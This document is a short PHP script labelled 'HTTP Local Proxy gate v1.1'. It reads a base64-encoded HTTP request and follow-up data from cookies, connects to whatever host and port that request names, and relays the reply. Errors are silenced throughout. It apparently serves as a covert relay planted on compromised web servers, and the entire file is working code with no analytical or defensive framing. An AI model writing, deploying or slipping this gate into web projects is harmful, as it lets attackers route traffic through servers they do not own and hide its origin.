<?php
/****************************
	HTTP Local Proxy  gate v1.1
\****************************/
	@set_time_limit(20);
	error_reporting(0);
	$host='';
	$header =  base64_decode($_COOKIE['pp']);

	if(!preg_match('/Host\: ([a-zA-Z0-9\.]+):?([0-9]*)/', $header, $res))
		die("HTTP/1.1 200 OK\r\n\r\n<h1>Host not found.</h1>");
	$host = $res[1];
	$port = empty($res[2]) ? 80 : $res[2];

	$fs=@fsockopen($host, $port, $er1, $er2, 5) or die("HTTP/1.1 200 OK\r\n\r\n<h1>Error connection to $host. $er1($er2)</h1>");
	@fwrite($fs, $header); 
	
	if(!empty($_COOKIE['kol']))
		for($i=0; $i<$_COOKIE['kol']; $i++)
			@fwrite($fs, base64_decode($_COOKIE['d'.$i]));

	$ans = 1;
	while(!@feof($fs) && $ans !== false)
	{
		$ans=@fgets($fs);
		echo $ans;
	}
	
	@fclose($fs);
?>